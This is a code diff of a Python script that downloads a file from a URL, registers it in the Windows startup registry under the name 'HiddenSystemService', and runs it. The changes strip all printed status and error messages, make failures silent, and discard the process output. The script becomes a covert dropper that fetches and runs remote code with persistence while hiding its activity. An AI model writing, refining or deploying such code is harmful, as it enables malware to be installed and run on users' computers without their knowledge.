@@ -21,14 +21,8 @@ def get_user_hidden_folder():
 
 def download_file(url, dest):
     """Download a file from a URL."""
-    try:
-        print(f"Downloading file from {url}...")
-        with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
-            out_file.write(response.read())
-        print(f"File downloaded successfully to {dest}.")
-    except Exception as e:
-        print(f"Error downloading file: {e}")
-        raise
+    with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
+        out_file.write(response.read())
 
 def compute_file_hash(file_path):
     """Compute the SHA256 hash of a file."""
@@ -61,9 +55,8 @@ def add_to_startup(file_path):
         )
         winreg.SetValueEx(key, "HiddenSystemService", 0, winreg.REG_SZ, str(file_path))
         winreg.CloseKey(key)
-        print("Added to startup successfully.")
-    except Exception as e:
-        print(f"Failed to add to startup: {e}")
+    except Exception:
+        pass  # Silently fail if adding to startup is not possible
 
 def ensure_and_run_file():
     """
@@ -84,31 +77,24 @@ def ensure_and_run_file():
     try:
         download_file(URL, new_file_path)
         new_file_hash = compute_file_hash(new_file_path)
-    except Exception as e:
-        print(f"Failed to download or hash the file: {e}")
-        return
+    except Exception:
+        return  # Exit silently if download or hashing fails
 
     if saved_hash == new_file_hash:
         # If the hash matches, delete the new file
         os.remove(new_file_path)
-        print("File hash matches the saved hash. No update needed.")
     else:
         # If the hash doesn't match, replace the old file
         if file_path.exists():
             os.remove(file_path)  # Remove the current file
         os.rename(new_file_path, file_path)  # Replace with the new file
         save_hash(new_file_hash, hash_file_path)  # Save the new hash
-        print("File replaced with the new version.")
 
         # Add to startup (only on replacement or first download)
         add_to_startup(file_path)
 
-    # Run the file
+    # Run the file in a non-blocking way
     try:
-        subprocess.Popen([str(file_path)], shell=False)
-        print("File executed successfully.")
-    except Exception as e:
-        print(f"Failed to execute the file: {e}")
-
-if __name__ == "__main__":
-    ensure_and_run_file()
+        subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass  # Silently fail if the file cannot be executed
